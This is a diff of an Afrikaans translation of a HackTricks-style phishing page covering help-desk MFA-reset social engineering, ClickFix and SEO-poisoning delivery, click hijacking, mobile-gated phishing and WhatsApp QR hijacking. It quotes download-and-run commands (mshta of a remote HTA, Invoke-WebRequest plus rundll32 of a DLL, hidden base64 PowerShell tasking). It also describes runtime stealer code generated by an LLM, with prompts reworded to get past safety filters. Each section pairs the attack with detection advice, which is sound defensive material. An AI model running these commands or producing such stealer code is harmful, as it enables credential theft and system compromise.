+Gebruik [**Phishious** ](https://github.com/Rices/Phishious)om te evalueer of jou e-pos in die spamfolder gaan beland, of dit geblokkeer sal word of suksesvol sal wees.
 
 ## High-Touch Identity Compromise (Help-Desk MFA Reset)
 
-Moderne intrusion sets slaan toenemend e-pos-lokmiddels heeltemal oor en **teiken die service-desk / identity-recovery-workflow direk** om MFA te omseil. Die aanval is volledig "living-off-the-land": sodra die operator geldige credentials besit, beweeg hy lateraal met ingeboude admin tooling – geen malware word benodig nie.<sup>[[6]](#references)</sup>
+Moderne intrusion sets slaan toenemend e-poslokkies heeltemal oor en **teiken die service-desk / identity-recovery-workflow direk** om MFA te omseil. Die aanval is volledig "living-off-the-land": sodra die operator geldige credentials besit, beweeg hy lateraal met ingeboude admin-tools – geen malware word benodig nie.<sup>[[6]](#references)</sup>
 
 ### Attack flow
-1. Recon die slagoffer
-* Versamel persoonlike en korporatiewe besonderhede vanaf LinkedIn, data breaches, publieke GitHub, ens.
-* Identifiseer hoëwaarde-identiteite (bestuurders, IT, finansies) en bepaal die **presiese help-desk-proses** vir wagwoord- / MFA-reset.
+1. Doen reconnaissance op die slagoffer.
+* Versamel persoonlike en korporatiewe besonderhede van LinkedIn, data breaches, publieke GitHub, ens.
+* Identifiseer identities met hoë waarde (bestuurders, IT, finansies) en bepaal die **presiese help-desk-proses** vir password / MFA reset.
 2. Real-time social engineering
-* Bel, Teams of chat met die help-desk terwyl jy jou as die teiken voordoen (dikwels met **spoofed caller-ID** of ’n **geklone stem**).
-* Verskaf die voorheen versamelde PII om kennisgebaseerde verifikasie te slaag.
+* Bel, gebruik Teams of chat met die help-desk terwyl jy jou as die teiken voordoen (dikwels met **spoofed caller-ID** of ’n **geklone stem**).
+* Verskaf die vooraf ingesamelde PII om kennisgebaseerde verifikasie te slaag.
 * Oortuig die agent om die **MFA-secret te reset** of ’n **SIM-swap** op ’n geregistreerde selfoonnommer uit te voer.
 3. Immediate post-access actions (≤60 min in real cases)
-* Vestig ’n foothold deur enige web-SSO-portaal.
-* Enumerate AD / AzureAD met ingeboude nutsmiddels (geen binaries word dropped nie):
+* Vestig ’n foothold deur enige web SSO-portal.
+* Enumerate AD / AzureAD met built-ins (geen binaries word dropped nie):
 ```powershell
 # list directory groups & privileged roles
 Get-ADGroup -Filter * -Properties Members | ?{$_.Members -match $env:USERNAME}
@@ -464,35 +464,35 @@ Get-MgDirectoryRole | ft DisplayName,Id
 # Enumerate devices the account can login to
 Get-MgUserRegisteredDevice -UserId <user@corp.local>
 ```
-* Lateral movement met **WMI**, **PsExec** of wettige **RMM**-agents wat reeds in die omgewing gewhitelist is.
+* Laterale beweging met **WMI**, **PsExec** of wettige **RMM**-agents wat reeds in die environment gewhitelist is.
 
 ### Detection & Mitigation
-* Behandel help-desk identity recovery as ’n **bevoorregte operasie** – vereis step-up authentication en bestuurdergoedkeuring.
-* Implementeer **Identity Threat Detection & Response (ITDR)** / **UEBA**-reëls wat waarskuwings genereer vir:
-* MFA-metode verander + authentication vanaf ’n nuwe toestel / geo.
+* Behandel help-desk identity recovery as ’n **privileged operation** – vereis step-up auth en manager approval.
+* Ontplooi **Identity Threat Detection & Response (ITDR)** / **UEBA**-reëls wat die volgende alert:
+* MFA-method verander + authentication vanaf ’n nuwe device / geo.
 * Onmiddellike elevation van dieselfde principal (user-→-admin).
 * Neem help-desk-oproepe op en vereis ’n **call-back na ’n reeds geregistreerde nommer** voordat enige reset uitgevoer word.
-* Implementeer **Just-In-Time (JIT) / Privileged Access** sodat nuut geresette rekeninge nie outomaties hoëprivilegie-tokens erf nie.
+* Implementeer **Just-In-Time (JIT) / Privileged Access** sodat nuut-geresette rekeninge nie outomaties high-privilege tokens erf nie.
 
 ---
 
 ## At-Scale Deception – SEO Poisoning & “ClickFix” Campaigns
-Commodity crews verreken die koste van high-touch ops met massa-aanvalle wat **search engines & ad networks as die delivery channel gebruik**.<sup>[[6]](#references)</sup>
+Commodity crews verlaag die koste van high-touch ops met massa-aanvalle wat **search engines en ad networks in die delivery channel verander**.<sup>[[6]](#references)</sup>
 
-1. **SEO poisoning / malvertising** stoot ’n fake resultaat soos `chromium-update[.]site` na die boonste posisie in search ads.
-2. Die slagoffer download ’n klein **first-stage loader** (dikwels JS/HTA/ISO). Voorbeelde wat deur Unit 42 gesien is:
+1. **SEO poisoning / malvertising** stoot ’n fake resultaat soos `chromium-update[.]site` na die boonste search ads.
+2. Die slagoffer laai ’n klein **first-stage loader** af (dikwels JS/HTA/ISO). Voorbeelde wat deur Unit 42 gesien is:
 * `RedLine stealer`
 * `Lumma stealer`
 * `Lampion Trojan`
-3. Die loader exfiltreer browser-cookies + credential DBs, en haal dan ’n **silent loader** wat – *in realtime* – besluit of dit die volgende moet deploy:
+3. Die loader exfiltreer browser cookies + credential DBs en trek dan ’n **silent loader** af wat – *in realtime* – besluit of dit die volgende moet deploy:
 * RAT (bv. AsyncRAT, RustDesk)
 * ransomware / wiper
 * persistence component (registry Run key + scheduled task)
 
 ### Hardening tips
-* Blokkeer nuutgeregistreerde domeine en dwing **Advanced DNS / URL Filtering** af op *search-ads* sowel as e-pos.
-* Beperk software-installation tot signed MSI / Store-packages, en weier `HTA`, `ISO`, `VBS`-uitvoering volgens beleid.
-* Monitor vir child processes van browsers wat installers oopmaak:
+* Blokkeer nuut-geregistreerde domeine en dwing **Advanced DNS / URL Filtering** af op *search-ads* sowel as e-pos.
+* Beperk sagteware-installering tot signed MSI / Store packages; weier `HTA`, `ISO` en `VBS` execution volgens beleid.
+* Monitor vir child processes van browsers wat installers open:
 ```yaml
 - parent_image: /Program Files/Google/Chrome/*
 and child_image: *\\*.exe
@@ -500,7 +500,7 @@ and child_image: *\\*.exe
 * Hunt vir LOLBins wat gereeld deur first-stage loaders misbruik word (bv. `regsvr32`, `curl`, `mshta`).
 
 ### Download-button click hijacking with TDS handoff
-Sommige fake software-portale hou die sigbare download-`href` na die **werklike GitHub/release-URL** gerig, maar hijack die **eerste** gebruikerinteraksie in JavaScript en stuur die slagoffer eerder na ’n **Traffic Distribution System (TDS)**-ketting.<sup>[[9]](#references)</sup>
+Sommige fake software portals hou die sigbare download-`href` na die **regte GitHub/release URL** gewys, maar hijack die **eerste** user interaction in JavaScript en stuur die slagoffer eerder in ’n **Traffic Distribution System (TDS)**-chain in.<sup>[[9]](#references)</sup>
 ```javascript
 const cachedOpen = window.open;
 document.addEventListener(isChromeDesktop() ? "mousedown" : "click", (e) => {
@@ -511,58 +511,58 @@ e.preventDefault();
 }, true);
 ```
 Sleutelkenmerke:
-- Die hook loop gewoonlik in die **capture phase** (`true`) op `document`, dus word dit vóór werfhandlers uitgevoer.
-- Chrome gebruik dikwels `mousedown` in plaas van `click` om die redirect aan ’n geldige **user gesture** gekoppel te hou en popup-blocker-bypass te verbeter.
-- Sommige variante maak vooraf `about:blank` oop of sintetiseer `<a target="_blank">`-klikke, en ken eers later die TDS-URL toe.
-- Browser-side limiete word dikwels in `localStorage` gestoor, dus kan die **eerste klik** malware bereik, terwyl refreshes/herprobeersels terugval na die goedaardig lykende sigbare skakel.
-- Die TDS kan volgens referrer, entry domain, GEO, browser/device fingerprint, VPN/datacenter-kontroles, klik-konteks en tellers per sessie filter, wat herhalings deur analiste nie-deterministies maak.
+- Die hook loop gewoonlik in die **capture phase** (`true`) op `document`, sodat dit voor werfhandlers geaktiveer word.
+- Chrome gebruik dikwels `mousedown` in plaas van `click` om die redirect aan ’n geldige **user gesture** gekoppel te hou en die omseiling van popup-blockers te verbeter.
+- Sommige variante maak vooraf `about:blank` oop of sintetiseer klikke op `<a target="_blank">`-elemente, en ken eers later die TDS-URL toe.
+- Browser-side caps word dikwels in `localStorage` gestoor, sodat die **eerste klik** malware kan bereik, terwyl refreshes/herprobeers na die oënskynlik goedaardige sigbare skakel terugval.
+- Die TDS kan filter volgens referrer, entry domain, GEO, browser/device fingerprint, VPN/datacenter-kontroles, klik-konteks en per-session counters, wat herhalings deur analiste nie-deterministies maak.
 
 Idees vir verdedigers:
-- Vergelyk die **vertoonde** `href` met die **werklike** navigasieteiken wat met die kliktyd gegenereer word.
-- Soek na `document.addEventListener(..., true)`-handlers wat beide `preventDefault()` en `stopImmediatePropagation()` rondom `window.open`, `about:blank` of sintetiese ankerklikke aanroep.
-- Behandel groepe nuut-geregistreerde sagteware-aflaaidomeine wat almal dieselfde CloudFront/JS-stage laai as ’n hoë-sein SEO-poisoning/TDS-patroon.
+- Vergelyk die **vertoonde** `href` met die **werklike** navigation target wat tydens die klik gegenereer word.
+- Soek na `document.addEventListener(..., true)`-handlers wat beide `preventDefault()` en `stopImmediatePropagation()` rondom `window.open`, `about:blank` of sintetiese anchor-klikke aanroep.
+- Behandel groepe nuut-geregistreerde sagteware-aflaaidomeine wat almal dieselfde CloudFront/JS stage laai as ’n sterk SEO-poisoning/TDS-patroon.
 
-### ClickFix vanaf vals verifikasiebladsye + LOLBAS-fetches wat soos argiewe lyk
-Sommige TDS-vertakkings eindig op ’n vals verifikasiebladsy (Cloudflare/IUAM-styl) wat die slagoffer aansê om ’n vertroude Windows-binêre lêer soos:<sup>[[9]](#references)</sup> te laat loop.
+### ClickFix vanaf vals verification pages + archive-looking LOLBAS fetches
+Sommige TDS-vertakkings eindig op ’n vals verification page (Cloudflare/IUAM-styl) wat die slagoffer opdrag gee om ’n trusted Windows binary soos:<sup>[[9]](#references)</sup> te laat loop.
 ```cmd
 C:\Windows\SysWOW64\mshta.exe https://example[.]com/navy.7z
 ```
 Notas:
-- `mshta.exe` voer die **HTA/VBScript aan die begin van die response** uit, selfs al gee die URL voor dat dit 'n `.7z`-argief is; bygevoegde argiefdata kan suiwer misleiding wees.
+- `mshta.exe` voer die **HTA/VBScript aan die begin van die respons** uit, selfs al gee die URL voor dat dit ’n `.7z`-argief is; bygevoegde argiefdata kan suiwer lokdata wees.
 - Opvolgstadiums hou dikwels aan om oor die lêertipe te lieg (`.rtf` vir PowerShell, `.asar` vir Python, ZIP-lêers met opgestopte binaries) en skakel dan oor na **manual PE mapping / in-memory execution**.
-- Indien jy op een van hierdie kettings reageer, behou **network + memory vanaf die eerste suksesvolle uitvoering**: latere herhalings wys dalk slegs 'n skadelose installer/SFX-pad of misluk omdat die payload/key release aan die oorspronklike TDS-sessie gebind was.
+- As jy op een van hierdie kettings reageer, behou **network + memory vanaf die eerste suksesvolle run**: latere herhalings wys dalk slegs ’n benigne installer/SFX-pad of misluk omdat die payload/key release aan die oorspronklike TDS-sessie gekoppel was.
 
-### ClickFix DLL-afleweringstegnieke (vals CERT-opdatering)
-* Lokmiddel: 'n gekloonde nasionale CERT-advisory met 'n **Update**-knoppie wat stap-vir-stap-“fix”-instruksies vertoon. Slagoffers word aangesê om 'n batch-lêer uit te voer wat 'n DLL aflaai en dit via `rundll32` uitvoer.<sup>[[12]](#references)</sup>
+### ClickFix DLL delivery tradecraft (fake CERT update)
+* Lokmiddel: ’n gekloonde nasionale CERT-advies met ’n **Update**-knoppie wat stap-vir-stap-“fix”-instruksies vertoon. Slagoffers word aangesê om ’n batch uit te voer wat ’n DLL aflaai en dit via `rundll32` uitvoer.<sup>[[12]](#references)</sup>
 * Tipiese batch-ketting wat waargeneem is:
 ```cmd
 echo powershell -Command "Invoke-WebRequest -Uri 'https://example[.]org/notepad2.dll' -OutFile '%TEMP%\notepad2.dll'"
 echo timeout /t 10
 echo rundll32.exe "%TEMP%\notepad2.dll",notepad
 ```
-* `Invoke-WebRequest` plaas die payload in `%TEMP%`, 'n kort slaaptyd verberg network-jitter, waarna `rundll32` die uitgevoerde entrypoint (`notepad`) oproep.
-* Die DLL stuur host-identiteit en poll C2 elke paar minute. Afgeleë tasking arriveer as **base64-encoded PowerShell** wat hidden en met policy bypass uitgevoer word:
+* `Invoke-WebRequest` plaas die payload in `%TEMP%`, ’n kort slaaptyd verberg network jitter, waarna `rundll32` die uitgevoerde entrypoint (`notepad`) oproep.
+* Die DLL stuur die host identity en poll elke paar minute vir C2. Remote tasking arriveer as **base64-encoded PowerShell** wat hidden en met policy bypass uitgevoer word:
 ```powershell
 powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('<b64_task>')) | Invoke-Expression"
 ```
-* Dit behou C2-buigsaamheid (die server kan take omruil sonder om die DLL op te dateer) en verberg console-windows. Soek na PowerShell-kinderprosesse van `rundll32.exe` waar `-WindowStyle Hidden` + `FromBase64String` + `Invoke-Expression` saam gebruik word.
-* Defenders kan HTTP(S)-callbacks van die vorm `...page.php?tynor=<COMPUTER>sss<USER>` en 5-minute polling-intervalle ná DLL-load opspoor.
+* Dit behou C2-flexibility (die server kan take omruil sonder om die DLL by te werk) en verberg console windows. Soek na PowerShell-kinders van `rundll32.exe` wat `-WindowStyle Hidden` + `FromBase64String` + `Invoke-Expression` saam gebruik.
+* Defenders kan HTTP(S)-callbacks in die vorm `...page.php?tynor=<COMPUTER>sss<USER>` en 5-minute poll-intervalle ná DLL-load soek.
 
 ---
 
-## Phishing-operasies verbeter deur AI
-Attackers koppel nou **LLM- en voice-clone-API's** vir volledig gepersonaliseerde lokmiddels en intydse interaksie.
+## AI-versterkte Phishing Operations
+Attackers koppel nou **LLM- & voice-clone-API’s** vir volledig gepersonaliseerde lokmiddels en intydse interaksie.
 
-| Layer | Voorbeeldgebruik deur threat actor |
-|-------|-----------------------------------|
-|Automation|Genereer & stuur >100 k e-posse / SMS'e met gerandomiseerde bewoording & tracking links.|
-|Generative AI|Produseer *eenmalige* e-posse wat na openbare M&A verwys, binnegrappies uit social media; deep-fake CEO-stem in callback scam.|
-|Agentic AI|Registreer domains outonoom, scrape open-source intel, en stel next-stage e-posse saam wanneer 'n slagoffer klik maar nie credentials indien nie.|
+| Layer | Example use by threat actor |
+|-------|-----------------------------|
+|Outomatisering|Genereer & stuur >100 k e-posse / SMS’e met gerandomiseerde bewoording & tracking links.|
+|Generatiewe AI|Produseer *eenmalige* e-posse wat na openbare M&A verwys, inside jokes uit social media; deep-fake CEO voice in callback scam.|
+|Agentic AI|Registreer outonoom domeine, scrape open-source intel, en stel next-stage e-posse op wanneer ’n slagoffer klik maar nie creds indien nie.|
 
 **Defence:**
-• Voeg **dynamic banners** by wat boodskappe uit onbetroubare automation uitlig (via ARC/DKIM-anomalieë).
-• Ontplooi **voice-biometric challenge phrases** vir hoërisiko-telefoniese versoeke.
-• Simuleer voortdurend AI-gegenereerde lokmiddels in awareness-programme – statiese templates is verouderd.
+• Voeg **dynamic banners** by wat boodskappe uit ontrusted automation uitlig (via ARC/DKIM anomalies).
+• Implementeer **voice-biometric challenge phrases** vir hoërisiko-telefoniese versoeke.
+• Simuleer voortdurend AI-generated lokmiddels in awareness programmes – static templates is obsolete.
 
 Sien ook – agentic browsing abuse vir credential phishing:
 
@@ -570,59 +570,59 @@ Sien ook – agentic browsing abuse vir credential phishing:
 ai-agent-mode-phishing-abusing-hosted-agent-browsers.md
 {{#endref}}
 
-Sien ook – AI agent abuse van plaaslike CLI-tools en MCP (vir secrets inventory en detection):
+Sien ook – AI agent abuse van local CLI tools en MCP (vir secrets inventory en detection):
 
 {{#ref}}
 ai-agent-abuse-local-ai-cli-tools-and-mcp.md
 {{#endref}}
 
-## LLM-assisted runtime assembly van phishing-JavaScript (in-browser codegen)
+## LLM-assisted runtime assembly van phishing JavaScript (in-browser codegen)
 
-Attackers kan skynbaar skadelose HTML stuur en die stealer **tydens runtime genereer** deur 'n **trusted LLM API** vir JavaScript te vra en dit dan in die blaaier uit te voer (bv. `eval` of dinamiese `<script>`).<sup>[[8]](#references)</sup>
+Attackers kan HTML wat benigne lyk lewer en die **stealer tydens runtime genereer** deur ’n **trusted LLM API** vir JavaScript te vra en dit dan in die browser uit te voer (bv. `eval` of dinamiese `<script>`).<sup>[[8]](#references)</sup>
 
-1. **Prompt-as-obfuscation:** enkodeer exfil-URL's/Base64-stringe in die prompt; herhaal die bewoording om safety filters te omseil en hallucinations te verminder.
-2. **Client-side API call:** wanneer dit laai, roep JS 'n publieke LLM (Gemini/DeepSeek/etc.) of 'n CDN-proxy aan; slegs die prompt/API-call is in statiese HTML teenwoordig.
-3. **Assemble & exec:** konkateniseer die response en voer dit uit (polimorfies per besoek):
+1. **Prompt-as-obfuscation:** enkodeer exfil URLs/Base64 strings in die prompt; itereer die bewoording om safety filters te omseil en hallucinations te verminder.
+2. **Client-side API call:** tydens load roep JS ’n public LLM (Gemini/DeepSeek/etc.) of ’n CDN proxy; slegs die prompt/API call is in die static HTML teenwoordig.
+3. **Assemble & exec:** konkateniseer die respons en voer dit uit (polymorphic per visit):
 ```javascript
 fetch("https://llm.example/v1/chat",{method:"POST",body:JSON.stringify({messages:[{role:"user",content:promptText}]}),headers:{"Content-Type":"application/json",Authorization:`Bearer ${apiKey}`}})
 .then(r=>r.json())
 .then(j=>{const payload=j.choices?.[0]?.message?.content; eval(payload);});
 ```
-4. **Phish/exfil:** generated code verpersoonlik die lokmiddel (bv. LogoKit token parsing) en plaas creds na die prompt-hidden endpoint.
+4. **Phish/exfil:** generated code personaliseer die lure (bv. LogoKit token parsing) en plaas creds na die prompt-verborge eindpunt.
 
-**Evasion traits**
+**Ontwykingseienskappe**
 - Verkeer tref bekende LLM-domains of betroubare CDN-proxies; soms via WebSockets na ’n backend.
-- Geen statiese payload nie; kwaadwillige JS bestaan slegs ná rendering.
-- Nie-deterministiese generasies produseer **unieke stealers per sessie**.
+- Geen statiese payload nie; malicious JS bestaan slegs ná rendering.
+- Nie-deterministiese generasies produseer **unieke stealers** per sessie.
 
-**Detection ideas**
-- Laat sandboxes met JS geaktiveer loop; merk **runtime `eval`/dynamic script creation sourced from LLM responses**.
-- Soek front-end POSTs na LLM APIs wat onmiddellik gevolg word deur `eval`/`Function` op teruggestuurde teks.
-- Waarsku oor ongoedgekeurde LLM-domains in kliëntverkeer, gevolg deur credential POSTs.
+**Deteksie-idees**
+- Gebruik sandboxes met JS geaktiveer; merk **runtime `eval`/dynamic script creation sourced from LLM responses**.
+- Soek vir front-end POSTs na LLM APIs wat onmiddellik gevolg word deur `eval`/`Function` op teruggestuurde teks.
+- Genereer ’n waarskuwing vir ongemagtigde LLM-domains in kliëntverkeer, plus daaropvolgende credential POSTs.
 
 ---
 
 ## MFA Fatigue / Push Bombing Variant – Forced Reset
-Benewens klassieke push-bombing, **forceer operateurs eenvoudig ’n nuwe MFA-registration** tydens die help-desk-oproep, wat die gebruiker se bestaande token ongeldig maak. Enige daaropvolgende login-prompt lyk vir die slagoffer legitiem.
+Benewens klassieke push-bombing, **force** operators eenvoudig ’n nuwe MFA-registrasie tydens die help-desk-oproep, waardeur die gebruiker se bestaande token ongeldig gemaak word. Enige daaropvolgende login-prompt verskyn vir die slagoffer as legitiem.
 ```text
 [Attacker]  →  Help-Desk:  “I lost my phone while travelling, can you unenrol it so I can add a new authenticator?”
 [Help-Desk] →  AzureAD: ‘Delete existing methods’ → sends registration e-mail
 [Attacker]  →  Completes new TOTP enrolment on their own device
 ```
-Monitor vir AzureAD/AWS/Okta-gebeure waar **`deleteMFA` + `addMFA`** **binne minute vanaf dieselfde IP** plaasvind.
+Monitor vir AzureAD/AWS/Okta-gebeurtenisse waar **`deleteMFA` + `addMFA`** **binne minute vanaf dieselfde IP** plaasvind.
 
 
 
 ## Clipboard Hijacking / Pastejacking
 
-Aanvallers kan kwaadwillige opdragte stilweg vanaf ’n gekompromitteerde of typosquatted-webblad na die slagoffer se knipbord kopieer en die gebruiker dan mislei om dit binne **Win + R**, **Win + X** of ’n terminale venster te plak, waardeur arbitrêre kode uitgevoer word sonder enige aflaai of aanhegsel.
+Aanvallers kan kwaadwillige opdragte stilweg na die slagoffer se knipbord kopieer vanaf ’n gekompromitteerde of typosquatted-webblad en die gebruiker dan mislei om dit binne **Win + R**, **Win + X** of ’n terminaalvenster te plak, waardeur arbitrêre kode uitgevoer word sonder enige aflaai of aanhegsel.
 
 
 {{#ref}}
 clipboard-hijacking.md
 {{#endref}}
 
-## Mobile Phishing & Malicious App Distribution (Android & iOS)
+## Mobile Phishing & Kwaadwillige App-verspreiding (Android & iOS)
 
 
 {{#ref}}
@@ -630,13 +630,13 @@ mobile-phishing-malicious-apps.md
 {{#endref}}
 
 ### WhatsApp device-linking hijack via QR social engineering
-* ’n Lokbladsy (bv. ’n vals ministerie-/CERT-“channel”) vertoon ’n WhatsApp Web/Desktop-QR-kode en gee die slagoffer opdrag om dit te skandeer, waardeur die aanvaller stilweg as ’n **linked device** bygevoeg word.<sup>[[12]](#references)</sup>
-* Die aanvaller kry onmiddellik sigbaarheid van kletse en kontakte totdat die sessie verwyder word. Slagoffers kan later ’n “new device linked”-kennisgewing sien; verdedigers kan jag na onverwagte device-link-gebeure kort ná besoeke aan onbetroubare QR-bladsye.
+* ’n Lokbladsy (bv. ’n vals ministerie/CERT-“channel”) vertoon ’n WhatsApp Web/Desktop-QR-kode en gee die slagoffer opdrag om dit te skandeer, wat die aanvaller stilweg as ’n **linked device** byvoeg.<sup>[[12]](#references)</sup>
+* Die aanvaller kry onmiddellik sigbaarheid van kletse en kontakte totdat die sessie verwyder word. Slagoffers kan later ’n “new device linked”-kennisgewing sien; verdedigers kan jag na onverwagte device-link-gebeurtenisse kort ná besoeke aan onbetroubare QR-bladsye.
 
-### Mobile‑gated phishing to evade crawlers/sandboxes
-Operateurs beperk hul phishing-vloeie toenemend agter ’n eenvoudige toestelkontrole sodat desktop-crawlers nooit die finale bladsye bereik nie. ’n Algemene patroon is ’n klein script wat toets of die DOM aanraakvermoë het en die resultaat na ’n bedienerendpoint stuur; nie‑mobiele kliënte ontvang HTTP 500 (of ’n leë bladsy), terwyl mobiele gebruikers die volledige vloei bedien word.<sup>[[7]](#references)</sup>
+### Mobile-gated phishing to evade crawlers/sandboxes
+Operateurs beperk toenemend toegang tot hul phishing-vloeie agter ’n eenvoudige toestelkontrole sodat desktop-crawlers nooit die finale bladsye bereik nie. ’n Algemene patroon is ’n klein script wat toets of die DOM aanraakvermoë het en die resultaat na ’n bediener-eindpunt stuur; nie-mobiele kliënte ontvang HTTP 500 (of ’n leë bladsy), terwyl mobiele gebruikers die volledige vloei kry.<sup>[[7]](#references)</sup>
 
-Minimal client snippet (typical logic):
+Minimal client snippet (tipiese logika):
 ```html
 <script src="/static/detect_device.js"></script>
 ```
@@ -646,33 +646,33 @@ const isMobile = ('ontouchstart' in document.documentElement);
 fetch('/detect', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({is_mobile:isMobile})})
 .then(()=>location.reload());
 ```
-Bedienergedrag wat dikwels waargeneem word:
-- Stel 'n sessiekoekie tydens die eerste laai.
+Servergedrag wat dikwels waargeneem word:
+- Stel ’n sessiekoekie tydens die eerste laai.
 - Aanvaar `POST /detect {"is_mobile":true|false}`.
-- Lewer 500 (of 'n plekhouer) aan daaropvolgende GET-versoeke wanneer `is_mobile=false`; bedien phishing slegs indien `true`.
+- Gee 500 (of ’n plekhouer) vir daaropvolgende GET-versoeke wanneer `is_mobile=false`; bedien phishing slegs indien `true`.
 
 Heuristieke vir opsporing en identifisering:
 - urlscan-navraag: `filename:"detect_device.js" AND page.status:500`
-- Web-telemetrie: volgorde van `GET /static/detect_device.js` → `POST /detect` → HTTP 500 vir nie-mobile; wettige mobile slagofferpaadjies lewer 200 met daaropvolgende HTML/JS.
-- Blokkeer of ondersoek bladsye noukeurig wat inhoud uitsluitlik op `ontouchstart` of soortgelyke toestelkontroles baseer.
+- Webtelemetrie: volgorde van `GET /static/detect_device.js` → `POST /detect` → HTTP 500 vir nie-mobiele toestelle; wettige mobiele slagofferpaaie gee 200 terug met daaropvolgende HTML/JS.
+- Blokkeer of ondersoek bladsye wat inhoud uitsluitlik op `ontouchstart` of soortgelyke toestelkontroles baseer.
 
 Verdedigingswenke:
-- Voer crawlers uit met mobile-agtige fingerprints en JS geaktiveer om beperkte inhoud bloot te lê.
-- Stel waarskuwings op vir verdagte 500-reaksies ná `POST /detect` op nuut geregistreerde domeine.
+- Voer crawlers met mobiele vingerafdrukke en geaktiveerde JS uit om inhoud wat toegang beperk, sigbaar te maak.
+- Stel waarskuwings op vir verdagte 500-antwoorde ná `POST /detect` op onlangs geregistreerde domeine.
 
 ## References
 
 - [1] [Generering van domeinvariasies wat in phishing gebruik word (Zeltser)](https://zeltser.com/domain-name-variations-in-phishing/)
-- [2] [Phishing vind: Gereedskap en tegnieke (0xPatrik)](https://0xpatrik.com/phishing-domains/)
-- [3] [Steel geloofsbriewe en omseil 2FA met noVNC (mr.d0x)](https://mrd0x.com/bypass-2fa-using-novnc/)
+- [2] [Phishing opspoor: Gereedskap en tegnieke (0xPatrik)](https://0xpatrik.com/phishing-domains/)
+- [3] [Steel geloofsbriewe & omseil 2FA met noVNC (mr.d0x)](https://mrd0x.com/bypass-2fa-using-novnc/)
 - [4] [Steel sessies en omseil 2FA met EvilnoVNC (darkbyte.net)](https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/)
 - [5] [Hoe om DKIM met Postfix op Debian Wheezy te installeer en op te stel (DigitalOcean)](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)
-- [6] [2025 Unit 42-verslag oor wêreldwye insidentreaksie – uitgawe oor sosiale manipulasie](https://unit42.paloaltonetworks.com/2025-unit-42-global-incident-response-report-social-engineering-edition/)
-- [7] [Stil Smishing – mobile-beheerde phishing-infrastruktuur en heuristieke (Sekoia.io)](https://blog.sekoia.io/silent-smishing-the-hidden-abuse-of-cellular-router-apis/)
-- [8] [Die volgende grens van runtime-samestellingsaanvalle: Gebruik van LLM's om phishing-JavaScript intyds te genereer](https://unit42.paloaltonetworks.com/real-time-malicious-javascript-through-llms/)
-- [9] [Identiteitsnabootsing, klik-kaping en TDS: Binne 'n malwareverspreiding-ekosisteem](https://research.checkpoint.com/2026/impersonation-click-hijacking-and-tds-inside-a-malware-distribution-ecosystem/)
-- [10] [Bitsquatting van Windows.com (Remy Hax)](https://remyhax.xyz/posts/bitsquatting-windows/)
+- [6] [2025 Unit 42-verslag oor wêreldwye insidentrespons – Sosiale-ingenieurswese-uitgawe](https://unit42.paloaltonetworks.com/2025-unit-42-global-incident-response-report-social-engineering-edition/)
+- [7] [Silent Smishing – mobiele-beheerde phishing-infrastruktuur en heuristieke (Sekoia.io)](https://blog.sekoia.io/silent-smishing-the-hidden-abuse-of-cellular-router-apis/)
+- [8] [Die volgende grens van runtime-assembly-aanvalle: Benutting van LLMs om phishing-JavaScript intyds te genereer](https://unit42.paloaltonetworks.com/real-time-malicious-javascript-through-llms/)
+- [9] [Nabootsing, klik-kaping en TDS: Binne ’n ekosisteem vir malware-verspreiding](https://research.checkpoint.com/2026/impersonation-click-hijacking-and-tds-inside-a-malware-distribution-ecosystem/)
+- [10] [Bitsquatting Windows.com (Remy Hax)](https://remyhax.xyz/posts/bitsquatting-windows/)
 - [11] [Kaping van verkeer na Microsoft se windows.com met bitflipping (BleepingComputer)](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)
-- [12] [Liefde? Eintlik: Valse dating-app as lokmiddel in geteikende spyware-veldtog in Pakistan gebruik](https://www.welivesecurity.com/en/eset-research/love-actually-fake-dating-app-used-lure-targeted-spyware-campaign-pakistan/)
-- [13] [ESET GhostChat IoCs en voorbeelde](https://github.com/eset/malware-ioc/tree/master/ghostchat)
+- [12] [Liefde? Eintlik: ’n Valse dating-app as lokmiddel in ’n geteikende spyware-veldtog in Pakistan](https://www.welivesecurity.com/en/eset-research/love-actually-fake-dating-app-used-lure-targeted-spyware-campaign-pakistan/)
+- [13] [ESET GhostChat IoCs en monsters](https://github.com/eset/malware-ioc/tree/master/ghostchat)
 {{#include ../../banners/hacktricks-training.md}}
